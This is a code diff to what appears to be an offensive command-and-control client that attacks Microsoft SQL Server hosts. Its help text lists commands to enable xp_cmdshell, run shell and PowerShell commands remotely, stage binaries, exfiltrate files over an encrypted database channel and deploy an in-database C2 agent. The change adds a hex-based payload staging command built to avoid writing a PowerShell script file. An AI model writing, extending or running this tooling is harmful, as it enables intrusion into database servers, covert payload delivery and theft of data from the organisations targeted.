@@ -18,7 +18,8 @@ Built-in commands (case-insensitive):
     xpinit <host:port> <login> <pass>       enable xp_cmdshell + sp_OA on MSSQL target
     xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
     xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
-    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
+    xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel (base64+AES)
+    xpstage-hex <payload>                  stage binary via hex SQL + T-SQL ADODB.Stream (no .ps1)
     xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
     xpagent init                    deploy xpagent in-DB C2 on IIS01 (runs xpagent_init.sql via SB)
     xpagent kill                    drop xpagent database (cleanup)
@@ -171,6 +172,16 @@ class ToneShellShell(C2Client):
                     else:
                         no_enc = len(parts) >= 3 and parts[2] == "--no-encrypt"
                         self._xp.cmd_xpstage(self, parts[1], encrypt=not no_enc)
+
+                elif cmd == "xpstage-hex":
+                    if not self.session:
+                        print("[!] not attached to a session")
+                    elif len(parts) < 2:
+                        print("usage: xpstage-hex <payload_name>")
+                    elif not self._xp.ready():
+                        print("[!] run xpinit first")
+                    else:
+                        self._xp.cmd_xpstage_hex(self, parts[1])
 
                 elif cmd == "xpexfil":
                     xp_parts = line.split()
